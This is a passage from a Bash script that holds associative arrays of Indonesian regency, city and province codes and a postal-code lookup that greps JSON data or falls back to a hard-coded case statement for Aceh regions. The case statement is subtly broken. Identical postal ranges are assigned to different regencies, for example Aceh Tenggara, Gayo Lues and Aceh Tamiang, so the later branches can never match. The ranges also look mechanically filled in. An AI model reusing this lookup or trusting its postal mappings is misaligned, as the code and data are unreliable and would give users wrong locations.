    ["1507"]="Kab. Tanjung Jabung Timur" ["1508"]="Kab. Bungo"
    ["1509"]="Kab. Tebo"
    ["1571"]="Kota Jambi" ["1572"]="Kota Sungai Penuh"
    ["1601"]="Kab. Ogan Komering Ulu" ["1602"]="Kab. Ogan Komering Ilir"
    ["1603"]="Kab. Muara Enim" ["1604"]="Kab. Lahat"
    ["1605"]="Kab. Musi Rawas" ["1606"]="Kab. Musi Banyuasin"
    ["1607"]="Kab. Banyuasin" ["1608"]="Kab. Ogan Komering Ulu Timur"
    ["1609"]="Kab. Ogan Komering Ulu Selatan" ["1610"]="Kab. Ogan Ilir"
    ["1611"]="Kab. Empat Lawang" ["1612"]="Kab. Penukal Abab Lematang Ilir"
    ["1613"]="Kab. Musi Rawas Utara"
    ["1671"]="Kota Palembang" ["1672"]="Kota Pagar Alam"
    ["1673"]="Kota Lubuk Linggau" ["1674"]="Kota Prabumulih"
    ["1701"]="Kab. Bengkulu Selatan" ["1702"]="Kab. Rejang Lebong"
    ["1703"]="Kab. Bengkulu Utara" ["1704"]="Kab. Kaur"
    ["1705"]="Kab. Seluma" ["1706"]="Kab. Muko Muko"
    ["1707"]="Kab. Lebong" ["1708"]="Kab. Kepahiang"
    ["1709"]="Kab. Bengkulu Tengah"
    ["1771"]="Kota Bengkulu"
    ["1801"]="Kab. Lampung Selatan" ["1802"]="Kab. Lampung Tengah"
    ["1803"]="Kab. Lampung Utara" ["1804"]="Kab. Lampung Barat"
    ["1805"]="Kab. Tulang Bawang" ["1806"]="Kab. Tanggamus"
    ["1807"]="Kab. Lampung Timur" ["1808"]="Kab. Way Kanan"
    ["1809"]="Kab. Pesawaran" ["1810"]="Kab. Pringsewu"
    ["1811"]="Kab. Mesuji" ["1812"]="Kab. Tulang Bawang Barat"
    ["1813"]="Kab. Pesisir Barat"
    ["1871"]="Kota Bandar Lampung" ["1872"]="Kota Metro"
    ["1901"]="Kab. Bangka" ["1902"]="Kab. Belitung"
    ["1903"]="Kab. Bangka Selatan" ["1904"]="Kab. Bangka Tengah"
    ["1905"]="Kab. Bangka Barat" ["1906"]="Kab. Belitung Timur"
    ["1971"]="Kota Pangkal Pinang"
    ["2101"]="Kab. Bintan" ["2102"]="Kab. Karimun"
    ["2103"]="Kab. Natuna" ["2104"]="Kab. Lingga"
    ["2105"]="Kab. Kepulauan Anambas"
    ["2171"]="Kota Batam" ["2172"]="Kota Tanjung Pinang"
    ["3101"]="Kab. Adm. Kep. Seribu"
    ["3171"]="Kota Adm. Jakarta Pusat" ["3172"]="Kota Adm. Jakarta Utara"
    ["3173"]="Kota Adm. Jakarta Barat" ["3174"]="Kota Adm. Jakarta Selatan"
    ["3175"]="Kota Adm. Jakarta Timur"
    ["3201"]="Kab. Bogor" ["3202"]="Kab. Sukabumi"
    ["3203"]="Kab. Cianjur" ["3204"]="Kab. Bandung"
    ["3205"]="Kab. Garut" ["3206"]="Kab. Tasikmalaya"
    ["3207"]="Kab. Ciamis" ["3208"]="Kab. Kuningan"
    ["3209"]="Kab. Cirebon" ["3210"]="Kab. Majalengka"
    ["3211"]="Kab. Sumedang" ["3212"]="Kab. Indramayu"
    ["3213"]="Kab. Subang" ["3214"]="Kab. Purwakarta"
    ["3215"]="Kab. Karawang" ["3216"]="Kab. Bekasi"
    ["3217"]="Kab. Bandung Barat" ["3218"]="Kab. Pangandaran"
    ["3271"]="Kota Bogor" ["3272"]="Kota Sukabumi"
    ["3273"]="Kota Bandung" ["3274"]="Kota Cirebon"
    ["3275"]="Kota Bekasi" ["3276"]="Kota Depok"
    ["3277"]="Kota Cimahi" ["3278"]="Kota Tasikmalaya"
    ["3279"]="Kota Banjar"
    ["3301"]="Kab. Cilacap" ["3302"]="Kab. Banyumas"
    ["3303"]="Kab. Purbalingga" ["3304"]="Kab. Banjarnegara"
    ["3305"]="Kab. Kebumen" ["3306"]="Kab. Purworejo"
    ["3307"]="Kab. Wonosobo" ["3308"]="Kab. Magelang"
    ["3309"]="Kab. Boyolali" ["3310"]="Kab. Klaten"
    ["3311"]="Kab. Sukoharjo" ["3312"]="Kab. Wonogiri"
    ["3313"]="Kab. Karanganyar" ["3314"]="Kab. Sragen"
    ["3315"]="Kab. Grobogan" ["3316"]="Kab. Blora"
    ["3317"]="Kab. Rembang" ["3318"]="Kab. Pati"
    ["3319"]="Kab. Kudus" ["3320"]="Kab. Jepara"
    ["3321"]="Kab. Demak" ["3322"]="Kab. Semarang"
    ["3323"]="Kab. Temanggung" ["3324"]="Kab. Kendal"
    ["3325"]="Kab. Batang" ["3326"]="Kab. Pekalongan"
    ["3327"]="Kab. Pemalang" ["3328"]="Kab. Tegal"
    ["3329"]="Kab. Brebes"
    ["3371"]="Kota Magelang" ["3372"]="Kota Surakarta"
    ["3373"]="Kota Salatiga" ["3374"]="Kota Semarang"
    ["3375"]="Kota Pekalongan" ["3376"]="Kota Tegal"
    ["3401"]="Kab. Kulon Progo" ["3402"]="Kab. Bantul"
    ["3403"]="Kab. Gunungkidul" ["3404"]="Kab. Sleman"
    ["3471"]="Kota Yogyakarta"
    ["3501"]="Kab. Pacitan" ["3502"]="Kab. Ponorogo"
    ["3503"]="Kab. Trenggalek" ["3504"]="Kab. Tulungagung"
    ["3505"]="Kab. Blitar" ["3506"]="Kab. Kediri"
    ["3507"]="Kab. Malang" ["3508"]="Kab. Lumajang"
    ["3509"]="Kab. Jember" ["3510"]="Kab. Banyuwangi"
    ["3511"]="Kab. Bondowoso" ["3512"]="Kab. Situbondo"
    ["3513"]="Kab. Probolinggo" ["3514"]="Kab. Pasuruan"
    ["3515"]="Kab. Sidoarjo" ["3516"]="Kab. Mojokerto"
    ["3517"]="Kab. Jombang" ["3518"]="Kab. Nganjuk"
    ["3519"]="Kab. Madiun" ["3520"]="Kab. Magetan"
    ["3521"]="Kab. Ngawi" ["3522"]="Kab. Bojonegoro"
    ["3523"]="Kab. Tuban" ["3524"]="Kab. Lamongan"
    ["3525"]="Kab. Gresik" ["3526"]="Kab. Bangkalan"
    ["3527"]="Kab. Sampang" ["3528"]="Kab. Pamekasan"
    ["3529"]="Kab. Sumenep"
    ["3571"]="Kota Kediri" ["3572"]="Kota Blitar"
    ["3573"]="Kota Malang" ["3574"]="Kota Probolinggo"
    ["3575"]="Kota Pasuruan" ["3576"]="Kota Mojokerto"
    ["3577"]="Kota Madiun" ["3578"]="Kota Surabaya"
    ["3579"]="Kota Batu"
    ["3601"]="Kab. Pandeglang" ["3602"]="Kab. Lebak"
    ["3603"]="Kab. Tangerang" ["3604"]="Kab. Serang"
    ["3671"]="Kota Tangerang" ["3672"]="Kota Cilegon"
    ["3673"]="Kota Serang" ["3674"]="Kota Tangerang Selatan"
    ["5101"]="Kab. Jembrana" ["5102"]="Kab. Tabanan"
    ["5103"]="Kab. Badung" ["5104"]="Kab. Gianyar"
    ["5105"]="Kab. Klungkung" ["5106"]="Kab. Bangli"
    ["5107"]="Kab. Karangasem" ["5108"]="Kab. Buleleng"
    ["5171"]="Kota Denpasar"
    ["5201"]="Kab. Lombok Barat" ["5202"]="Kab. Lombok Tengah"
    ["5203"]="Kab. Lombok Timur" ["5204"]="Kab. Sumbawa"
    ["5205"]="Kab. Dompu" ["5206"]="Kab. Bima"
    ["5207"]="Kab. Sumbawa Barat" ["5208"]="Kab. Lombok Utara"
    ["5271"]="Kota Mataram" ["5272"]="Kota Bima"
    ["5301"]="Kab. Kupang" ["5302"]="Kab. Timor Tengah Selatan"
    ["5303"]="Kab. Timor Tengah Utara" ["5304"]="Kab. Belu"
    ["5305"]="Kab. Alor" ["5306"]="Kab. Flores Timur"
    ["5307"]="Kab. Sikka" ["5308"]="Kab. Ende"
    ["5309"]="Kab. Ngada" ["5310"]="Kab. Manggarai"
    ["5311"]="Kab. Sumba Timur" ["5312"]="Kab. Sumba Barat"
    ["5313"]="Kab. Lembata" ["5314"]="Kab. Rote Ndao"
    ["5315"]="Kab. Manggarai Barat" ["5316"]="Kab. Nagekeo"
    ["5317"]="Kab. Sumba Tengah" ["5318"]="Kab. Sumba Barat Daya"
    ["5319"]="Kab. Manggarai Timur" ["5320"]="Kab. Sabu Raijua"
    ["5321"]="Kab. Malaka"
    ["5371"]="Kota Kupang"
    ["6101"]="Kab. Sambas" ["6102"]="Kab. Mempawah"
    ["6103"]="Kab. Sanggau" ["6104"]="Kab. Ketapang"
    ["6105"]="Kab. Sintang" ["6106"]="Kab. Kapuas Hulu"
    ["6107"]="Kab. Bengkayang" ["6108"]="Kab. Landak"
    ["6109"]="Kab. Sekadau" ["6110"]="Kab. Melawi"
    ["6111"]="Kab. Kayong Utara" ["6112"]="Kab. Kubu Raya"
    ["6171"]="Kota Pontianak" ["6172"]="Kota Singkawang"
    ["6201"]="Kab. Kotawaringin Barat" ["6202"]="Kab. Kotawaringin Timur"
    ["6203"]="Kab. Kapuas" ["6204"]="Kab. Barito Selatan"
    ["6205"]="Kab. Barito Utara" ["6206"]="Kab. Katingan"
    ["6207"]="Kab. Seruyan" ["6208"]="Kab. Sukamara"
    ["6209"]="Kab. Lamandau" ["6210"]="Kab. Gunung Mas"
    ["6211"]="Kab. Pulang Pisau" ["6212"]="Kab. Murung Raya"
    ["6213"]="Kab. Barito Timur"
    ["6271"]="Kota Palangkaraya"
    ["6301"]="Kab. Tanah Laut" ["6302"]="Kab. Kotabaru"
    ["6303"]="Kab. Banjar" ["6304"]="Kab. Barito Kuala"
    ["6305"]="Kab. Tapin" ["6306"]="Kab. Hulu Sungai Selatan"
    ["6307"]="Kab. Hulu Sungai Tengah" ["6308"]="Kab. Hulu Sungai Utara"
    ["6309"]="Kab. Tabalong" ["6310"]="Kab. Tanah Bumbu"
    ["6311"]="Kab. Balangan"
    ["6371"]="Kota Banjarmasin" ["6372"]="Kota Banjarbaru"
    ["6401"]="Kab. Paser" ["6402"]="Kab. Kutai Kartanegara"
    ["6403"]="Kab. Berau" ["6407"]="Kab. Kutai Barat"
    ["6408"]="Kab. Kutai Timur" ["6409"]="Kab. Penajam Paser Utara"
    ["6411"]="Kab. Mahakam Ulu"
    ["6471"]="Kota Balikpapan" ["6472"]="Kota Samarinda"
    ["6474"]="Kota Bontang"
    ["6501"]="Kab. Bulungan" ["6502"]="Kab. Malinau"
    ["6503"]="Kab. Nunukan" ["6504"]="Kab. Tana Tidung"
    ["6571"]="Kota Tarakan"
    ["7101"]="Kab. Bolaang Mongondow" ["7102"]="Kab. Minahasa"
    ["7103"]="Kab. Kepulauan Sangihe" ["7104"]="Kab. Kepulauan Talaud"
    ["7105"]="Kab. Minahasa Selatan" ["7106"]="Kab. Minahasa Utara"
    ["7107"]="Kab. Minahasa Tenggara" ["7108"]="Kab. Bolaang Mongondow Utara"
    ["7109"]="Kab. Kep. Siau Tagulandang Biaro" ["7110"]="Kab. Bolaang Mongondow Timur"
    ["7111"]="Kab. Bolaang Mongondow Selatan"
    ["7171"]="Kota Manado" ["7172"]="Kota Bitung"
    ["7173"]="Kota Tomohon" ["7174"]="Kota Kotamobagu"
    ["7201"]="Kab. Banggai" ["7202"]="Kab. Poso"
    ["7203"]="Kab. Donggala" ["7204"]="Kab. Toli Toli"
    ["7205"]="Kab. Buol" ["7206"]="Kab. Morowali"
    ["7207"]="Kab. Banggai Kepulauan" ["7208"]="Kab. Parigi Moutong"
    ["7209"]="Kab. Tojo Una Una" ["7210"]="Kab. Sigi"
    ["7211"]="Kab. Banggai Laut" ["7212"]="Kab. Morowali Utara"
    ["7271"]="Kota Palu"
    ["7301"]="Kab. Kepulauan Selayar" ["7302"]="Kab. Bulukumba"
    ["7303"]="Kab. Bantaeng" ["7304"]="Kab. Jeneponto"
    ["7305"]="Kab. Takalar" ["7306"]="Kab. Gowa"
    ["7307"]="Kab. Sinjai" ["7308"]="Kab. Bone"
    ["7309"]="Kab. Maros" ["7310"]="Kab. Pangkajene Kepulauan"
    ["7311"]="Kab. Barru" ["7312"]="Kab. Soppeng"
    ["7313"]="Kab. Wajo" ["7314"]="Kab. Sidenreng Rappang"
    ["7315"]="Kab. Pinrang" ["7316"]="Kab. Enrekang"
    ["7317"]="Kab. Luwu" ["7318"]="Kab. Tana Toraja"
    ["7322"]="Kab. Luwu Utara" ["7324"]="Kab. Luwu Timur"
    ["7326"]="Kab. Toraja Utara"
    ["7371"]="Kota Makassar" ["7372"]="Kota Pare Pare"
    ["7373"]="Kota Palopo"
    ["7401"]="Kab. Kolaka" ["7402"]="Kab. Konawe"
    ["7403"]="Kab. Muna" ["7404"]="Kab. Buton"
    ["7405"]="Kab. Konawe Selatan" ["7406"]="Kab. Bombana"
    ["7407"]="Kab. Wakatobi" ["7408"]="Kab. Kolaka Utara"
    ["7409"]="Kab. Konawe Utara" ["7410"]="Kab. Buton Utara"
    ["7411"]="Kab. Kolaka Timur" ["7412"]="Kab. Konawe Kepulauan"
    ["7413"]="Kab. Muna Barat" ["7414"]="Kab. Buton Tengah"
    ["7415"]="Kab. Buton Selatan"
    ["7471"]="Kota Kendari" ["7472"]="Kota Bau Bau"
    ["7501"]="Kab. Gorontalo" ["7502"]="Kab. Boalemo"
    ["7503"]="Kab. Bone Bolango" ["7504"]="Kab. Pahuwato"
    ["7505"]="Kab. Gorontalo Utara"
    ["7571"]="Kota Gorontalo"
    ["7601"]="Kab. Pasangkayu" ["7602"]="Kab. Mamuju"
    ["7603"]="Kab. Mamasa" ["7604"]="Kab. Polewali Mandar"
    ["7605"]="Kab. Majene" ["7606"]="Kab. Mamuju Tengah"
    ["8101"]="Kab. Maluku Tengah" ["8102"]="Kab. Maluku Tenggara"
    ["8103"]="Kab. Kepulauan Tanimbar" ["8104"]="Kab. Buru"
    ["8105"]="Kab. Seram Bagian Timur" ["8106"]="Kab. Seram Bagian Barat"
    ["8107"]="Kab. Kepulauan Aru" ["8108"]="Kab. Maluku Barat Daya"
    ["8109"]="Kab. Buru Selatan"
    ["8171"]="Kota Ambon" ["8172"]="Kota Tual"
    ["8201"]="Kab. Halmahera Barat" ["8202"]="Kab. Halmahera Tengah"
    ["8203"]="Kab. Halmahera Utara" ["8204"]="Kab. Halmahera Selatan"
    ["8205"]="Kab. Kepulauan Sula" ["8206"]="Kab. Halmahera Timur"
    ["8207"]="Kab. Pulau Morotai" ["8208"]="Kab. Pulau Taliabu"
    ["8271"]="Kota Ternate" ["8272"]="Kota Tidore Kepulauan"
    ["9101"]="Kab. Merauke" ["9102"]="Kab. Jayawijaya"
    ["9103"]="Kab. Jayapura" ["9104"]="Kab. Nabire"
    ["9105"]="Kab. Kepulauan Yapen" ["9106"]="Kab. Biak Numfor"
    ["9107"]="Kab. Puncak Jaya" ["9108"]="Kab. Paniai"
    ["9109"]="Kab. Mimika" ["9110"]="Kab. Sarmi"
    ["9111"]="Kab. Keerom" ["9112"]="Kab. Pegunungan Bintang"
    ["9113"]="Kab. Yahukimo" ["9114"]="Kab. Tolikara"
    ["9115"]="Kab. Waropen" ["9116"]="Kab. Boven Digoel"
    ["9117"]="Kab. Mappi" ["9118"]="Kab. Asmat"
    ["9119"]="Kab. Supiori" ["9120"]="Kab. Mamberamo Raya"
    ["9121"]="Kab. Mamberamo Tengah" ["9122"]="Kab. Yalimo"
    ["9123"]="Kab. Lanny Jaya" ["9124"]="Kab. Nduga"
    ["9125"]="Kab. Puncak" ["9126"]="Kab. Dogiyai"
    ["9127"]="Kab. Intan Jaya" ["9128"]="Kab. Deiyai"
    ["9171"]="Kota Jayapura"
    ["9201"]="Kab. Sorong" ["9202"]="Kab. Manokwari"
    ["9203"]="Kab. Fak Fak" ["9204"]="Kab. Sorong Selatan"
    ["9205"]="Kab. Raja Ampat" ["9206"]="Kab. Teluk Bintuni"
    ["9207"]="Kab. Teluk Wondama" ["9208"]="Kab. Kaimana"
    ["9209"]="Kab. Tambrauw" ["9210"]="Kab. Maybrat"
    ["9211"]="Kab. Manokwari Selatan" ["9212"]="Kab. Pegunungan Arfak"
    ["9271"]="Kota Sorong"
)
declare -A provinsi_data=(
    ["11"]="Aceh" ["12"]="Sumatera Utara"
    ["13"]="Sumatera Barat" ["14"]="Riau"
    ["15"]="Jambi" ["16"]="Sumatera Selatan"
    ["17"]="Bengkulu" ["18"]="Lampung"
    ["19"]="Kepulauan Bangka Belitung" ["21"]="Kepulauan Riau"
    ["31"]="DKI Jakarta" ["32"]="Jawa Barat"
    ["33"]="Jawa Tengah" ["34"]="Daerah Istimewa Yogyakarta"
    ["35"]="Jawa Timur" ["36"]="Banten"
    ["51"]="Bali" ["52"]="Nusa Tenggara Barat"
    ["53"]="Nusa Tenggara Timur" ["61"]="Kalimantan Barat"
    ["62"]="Kalimantan Tengah" ["63"]="Kalimantan Selatan"
    ["64"]="Kalimantan Timur" ["65"]="Kalimantan Utara"
    ["71"]="Sulawesi Utara" ["72"]="Sulawesi Tengah"
    ["73"]="Sulawesi Selatan" ["74"]="Sulawesi Tenggara"
    ["75"]="Gorontalo" ["76"]="Sulawesi Barat"
    ["81"]="Maluku" ["82"]="Maluku Utara"
    ["91"]="Papua" ["92"]="Papua Barat"
)
found=0
nama_daerah=""
kode_bps=""
if [[ -n "$json_data" ]]; then
if echo "$json_data" | grep -q "\"$kode_pos\""; then
nama_daerah=$(echo "$json_data" | grep -A 5 "\"$kode_pos\"" | grep '"nama"' | head -1 | sed 's/.*"nama": *"\([^"]*\)".*/\1/')
kode_bps=$(echo "$json_data" | grep -A 5 "\"$kode_pos\"" | grep '"bps"' | head -1 | sed 's/.*"bps": *"\([^"]*\)".*/\1/')
if [[ -n "$nama_daerah" ]]; then
found=1
fi
fi
fi
if [[ $found -eq 0 ]]; then
case "$kode_pos" in
        23111|23112|23113|23114|23115|23116|23117|23118|23119|23121|23122|23123|23124|23125|23126|23127|23128|23129|23131|23132|23133|23134|23135|23136|23137|23138|23139|23141|23142|23143|23144|23145|23146|23147|23148|23149|23151|23152|23153|23154|23155|23156|23157|23158|23159|23161|23162|23163|23164|23165|23166|23167|23168|23169|23171|23172|23173|23174|23175|23176|23177|23178|23179|23181|23182|23183|23184|23185|23186|23187|23188|23189|23191|23192|23193|23194|23195|23196|23197|23198|23199)
            nama_daerah="Banda Aceh"
            found=1
            ;;
        23311|23312|23313|23314|23315|23316|23317|23318|23319|23321|23322|23323|23324|23325|23326|23327|23328|23329|23331|23332|23333|23334|23335|23336|23337|23338|23339|23341|23342|23343|23344|23345|23346|23347|23348|23349|23351|23352|23353|23354|23355|23356|23357|23358|23359|23361|23362|23363|23364|23365|23366|23367|23368|23369|23371|23372|23373|23374|23375|23376|23377|23378|23379|23381|23382|23383|23384|23385|23386|23387|23388|23389|23391|23392|23393|23394|23395|23396|23397|23398|23399)
            nama_daerah="Aceh Selatan"
            found=1
            ;;
        24611|24612|24613|24614|24615|24616|24617|24618|24619|24621|24622|24623|24624|24625|24626|24627|24628|24629|24631|24632|24633|24634|24635|24636|24637|24638|24639|24641|24642|24643|24644|24645|24646|24647|24648|24649|24651|24652|24653|24654|24655|24656|24657|24658|24659|24661|24662|24663|24664|24665|24666|24667|24668|24669|24671|24672|24673|24674|24675|24676|24677|24678|24679|24681|24682|24683|24684|24685|24686|24687|24688|24689|24691|24692|24693|24694|24695|24696|24697|24698|24699)
            nama_daerah="Aceh Tenggara"
            found=1
            ;;
        24411|24412|24413|24414|24415|24416|24417|24418|24419|24421|24422|24423|24424|24425|24426|24427|24428|24429|24431|24432|24433|24434|24435|24436|24437|24438|24439|24441|24442|24443|24444|24445|24446|24447|24448|24449|24451|24452|24453|24454|24455|24456|24457|24458|24459|24461|24462|24463|24464|24465|24466|24467|24468|24469|24471|24472|24473|24474|24475|24476|24477|24478|24479|24481|24482|24483|24484|24485|24486|24487|24488|24489|24491|24492|24493|24494|24495|24496|24497|24498|24499)
            nama_daerah="Aceh Timur"
            found=1
            ;;
        24511|24512|24513|24514|24515|24516|24517|24518|24519|24521|24522|24523|24524|24525|24526|24527|24528|24529|24531|24532|24533|24534|24535|24536|24537|24538|24539|24541|24542|24543|24544|24545|24546|24547|24548|24549|24551|24552|24553|24554|24555|24556|24557|24558|24559|24561|24562|24563|24564|24565|24566|24567|24568|24569|24571|24572|24573|24574|24575|24576|24577|24578|24579|24581|24582|24583|24584|24585|24586|24587|24588|24589|24591|24592|24593|24594|24595|24596|24597|24598|24599)
            nama_daerah="Aceh Tengah"
            found=1
            ;;
        23611|23612|23613|23614|23615|23616|23617|23618|23619|23621|23622|23623|23624|23625|23626|23627|23628|23629|23631|23632|23633|23634|23635|23636|23637|23638|23639|23641|23642|23643|23644|23645|23646|23647|23648|23649|23651|23652|23653|23654|23655|23656|23657|23658|23659|23661|23662|23663|23664|23665|23666|23667|23668|23669|23671|23672|23673|23674|23675|23676|23677|23678|23679|23681|23682|23683|23684|23685|23686|23687|23688|23689|23691|23692|23693|23694|23695|23696|23697|23698|23699)
            nama_daerah="Aceh Barat"
            found=1
            ;;
        23911|23912|23913|23914|23915|23916|23917|23918|23919|23921|23922|23923|23924|23925|23926|23927|23928|23929|23931|23932|23933|23934|23935|23936|23937|23938|23939|23941|23942|23943|23944|23945|23946|23947|23948|23949|23951|23952|23953|23954|23955|23956|23957|23958|23959|23961|23962|23963|23964|23965|23966|23967|23968|23969|23971|23972|23973|23974|23975|23976|23977|23978|23979|23981|23982|23983|23984|23985|23986|23987|23988|23989|23991|23992|23993|23994|23995|23996|23997|23998|23999)
            nama_daerah="Aceh Besar"
            found=1
            ;;
        24111|24112|24113|24114|24115|24116|24117|24118|24119|24121|24122|24123|24124|24125|24126|24127|24128|24129|24131|24132|24133|24134|24135|24136|24137|24138|24139|24141|24142|24143|24144|24145|24146|24147|24148|24149|24151|24152|24153|24154|24155|24156|24157|24158|24159|24161|24162|24163|24164|24165|24166|24167|24168|24169|24171|24172|24173|24174|24175|24176|24177|24178|24179|24181|24182|24183|24184|24185|24186|24187|24188|24189|24191|24192|24193|24194|24195|24196|24197|24198|24199)
            nama_daerah="Pidie"
            found=1
            ;;
        24311|24312|24313|24314|24315|24316|24317|24318|24319|24321|24322|24323|24324|24325|24326|24327|24328|24329|24331|24332|24333|24334|24335|24336|24337|24338|24339|24341|24342|24343|24344|24345|24346|24347|24348|24349|24351|24352|24353|24354|24355|24356|24357|24358|24359|24361|24362|24363|24364|24365|24366|24367|24368|24369|24371|24372|24373|24374|24375|24376|24377|24378|24379|24381|24382|24383|24384|24385|24386|24387|24388|24389|24391|24392|24393|24394|24395|24396|24397|24398|24399)
            nama_daerah="Aceh Utara"
            found=1
            ;;
        23811|23812|23813|23814|23815|23816|23817|23818|23819|23821|23822|23823|23824|23825|23826|23827|23828|23829|23831|23832|23833|23834|23835|23836|23837|23838|23839|23841|23842|23843|23844|23845|23846|23847|23848|23849|23851|23852|23853|23854|23855|23856|23857|23858|23859|23861|23862|23863|23864|23865|23866|23867|23868|23869|23871|23872|23873|23874|23875|23876|23877|23878|23879|23881|23882|23883|23884|23885|23886|23887|23888|23889|23891|23892|23893|23894|23895|23896|23897|23898|23899)
            nama_daerah="Simeulue"
            found=1
            ;;
        24711|24712|24713|24714|24715|24716|24717|24718|24719|24721|24722|24723|24724|24725|24726|24727|24728|24729|24731|24732|24733|24734|24735|24736|24737|24738|24739|24741|24742|24743|24744|24745|24746|24747|24748|24749|24751|24752|24753|24754|24755|24756|24757|24758|24759|24761|24762|24763|24764|24765|24766|24767|24768|24769|24771|24772|24773|24774|24775|24776|24777|24778|24779|24781|24782|24783|24784|24785|24786|24787|24788|24789|24791|24792|24793|24794|24795|24796|24797|24798|24799)
            nama_daerah="Aceh Singkil"
            found=1
            ;;
        24211|24212|24213|24214|24215|24216|24217|24218|24219|24221|24222|24223|24224|24225|24226|24227|24228|24229|24231|24232|24233|24234|24235|24236|24237|24238|24239|24241|24242|24243|24244|24245|24246|24247|24248|24249|24251|24252|24253|24254|24255|24256|24257|24258|24259|24261|24262|24263|24264|24265|24266|24267|24268|24269|24271|24272|24273|24274|24275|24276|24277|24278|24279|24281|24282|24283|24284|24285|24286|24287|24288|24289|24291|24292|24293|24294|24295|24296|24297|24298|24299)
            nama_daerah="Bireuen"
            found=1
            ;;
        23711|23712|23713|23714|23715|23716|23717|23718|23719|23721|23722|23723|23724|23725|23726|23727|23728|23729|23731|23732|23733|23734|23735|23736|23737|23738|23739|23741|23742|23743|23744|23745|23746|23747|23748|23749|23751|23752|23753|23754|23755|23756|23757|23758|23759|23761|23762|23763|23764|23765|23766|23767|23768|23769|23771|23772|23773|23774|23775|23776|23777|23778|23779|23781|23782|23783|23784|23785|23786|23787|23788|23789|23791|23792|23793|23794|23795|23796|23797|23798|23799)
            nama_daerah="Aceh Barat Daya"
            found=1
            ;;
        24611|24612|24613|24614|24615|24616|24617|24618|24619|24621|24622|24623|24624|24625|24626|24627|24628|24629|24631|24632|24633|24634|24635|24636|24637|24638|24639|24641|24642|24643|24644|24645|24646|24647|24648|24649|24651|24652|24653|24654|24655|24656|24657|24658|24659|24661|24662|24663|24664|24665|24666|24667|24668|24669|24671|24672|24673|24674|24675|24676|24677|24678|24679|24681|24682|24683|24684|24685|24686|24687|24688|24689|24691|24692|24693|24694|24695|24696|24697|24698|24699)
            nama_daerah="Gayo Lues"
            found=1
            ;;
        23611|23612|23613|23614|23615|23616|23617|23618|23619|23621|23622|23623|23624|23625|23626|23627|23628|23629|23631|23632|23633|23634|23635|23636|23637|23638|23639|23641|23642|23643|23644|23645|23646|23647|23648|23649|23651|23652|23653|23654|23655|23656|23657|23658|23659|23661|23662|23663|23664|23665|23666|23667|23668|23669|23671|23672|23673|23674|23675|23676|23677|23678|23679|23681|23682|23683|23684|23685|23686|23687|23688|23689|23691|23692|23693|23694|23695|23696|23697|23698|23699)
            nama_daerah="Aceh Jaya"
            found=1
            ;;
        23611|23612|23613|23614|23615|23616|23617|23618|23619|23621|23622|23623|23624|23625|23626|23627|23628|23629|23631|23632|23633|23634|23635|23636|23637|23638|23639|23641|23642|23643|23644|23645|23646|23647|23648|23649|23651|23652|23653|23654|23655|23656|23657|23658|23659|23661|23662|23663|23664|23665|23666|23667|23668|23669|23671|23672|23673|23674|23675|23676|23677|23678|23679|23681|23682|23683|23684|23685|23686|23687|23688|23689|23691|23692|23693|23694|23695|23696|23697|23698|23699)
            nama_daerah="Nagan Raya"
            found=1
            ;;
        24611|24612|24613|24614|24615|24616|24617|24618|24619|24621|24622|24623|24624|24625|24626|24627|24628|24629|24631|24632|24633|24634|24635|24636|24637|24638|24639|24641|24642|24643|24644|24645|24646|24647|24648|24649|24651|24652|24653|24654|24655|24656|24657|24658|24659|24661|24662|24663|24664|24665|24666|24667|24668|24669|24671|24672|24673|24674|24675|24676|24677|24678|24679|24681|24682|24683|24684|24685|24686|24687|24688|24689|24691|24692|24693|24694|24695|24696|24697|24698|24699)
            nama_daerah="Aceh Tamiang"
            found=1
            ;;
        24511|24512|24513|24514|24515|24516|24517|24518|24519|24521|24522|24523|24524|24525|24526|24527|24528|24529|24531|24532|24533|24534|24535|24536|24537|24538|24539|24541|24542|24543|24544|24545|24546|24547|24548|24549|24551|24552|24553|24554|24555|24556|24557|24558|24559|24561|24562|24563|24564|24565|24566|24567|24568|24569|24571|24572|24573|24574|24575|24576|24577|24578|24579|24581|24582|24583|24584|24585|24586|24587|24588|24589|24591|24592|24593|24594|24595|24596|24597|24598|24599)
            nama_daerah="Bener Meriah"
            found=1
            ;;
        24111|24112|24113|24114|24115|24116|24117|24118|24119|24121|24122|24123|24124|24125|24126|24127|24128|24129|24131|24132|24133|24134|24135|24136|24137|24138|24139|24141|24142|24143|24144|24145|24146|24147|24148|24149|24151|24152|24153|24154|24155|24156|24157|24158|24159|24161|24162|24163|24164|24165|24166|24167|24168|24169|24171|24172|24173|24174|24175|24176|24177|24178|24179|24181|24182|24183|24184|24185|24186|24187|24188|24189|24191|24192|24193|24194|24195|24196|24197|24198|24199)
            nama_daerah="Pidie Jaya"
            found=1
            ;;
        24411|24412|24413|24414|24415|24416|24417|24418|24419|24421|24422|24423|24424|24425|24426|24427|24428|24429|24431|24432|24433|24434|24435|24436|24437|24438|24439|24441|24442|24443|24444|24445|24446|24447|24448|24449|24451|24452|24453|24454|24455|24456|24457|24458|24459|24461|24462|24463|24464|24465|24466|24467|24468|24469|24471|24472|24473|24474|24475|24476|24477|24478|24479|24481|24482|24483|24484|24485|24486|24487|24488|24489|24491|24492|24493|24494|24495|24496|24497|24498|24499)
            nama_daerah="Kota Langsa"
            found=1
            ;;
        24311|24312|24313|24314|24315|24316|24317|24318|24319|24321|24322|24323|24324|24325|24326|24327|24328|24329|24331|24332|24333|24334|24335|24336|24337|24338|24339|24341|24342|24343|24344|24345|24346|24347|24348|24349|24351|24352|24353|24354|24355|24356|24357|24358|24359|24361|24362|24363|24364|24365|24366|24367|24368|24369|24371|24372|24373|24374|24375|24376|24377|24378|24379|24381|24382|24383|24384|24385|24386|24387|24388|24389|24391|24392|24393|24394|24395|24396|24397|24398|24399)
            nama_daerah="Kota Lhokseumawe"
            found=1
            ;;
        23511|23512|23513|23514|23515|23516|23517|23518|23519|23521|23522|23523|23524|23525|23526|23527|23528|23529|23531|23532|23533|23534|23535|23536|23537|23538|23539|23541|23542|23543|23544|23545|23546|23547|23548|23549|23551|23552|23553|23554|23555|23556|23557|23558|23559|23561|23562|23563|23564|23565|23566|23567|23568|23569|23571|23572|23573|23574|23575|23576|23577|23578|23579|23581|23582|23583|23584|23585|23586|23587|23588|23589|23591|23592|23593|23594|23595|23596|23597|23598|23599)
            nama_daerah="Kota Sabang"
            found=1
            ;;
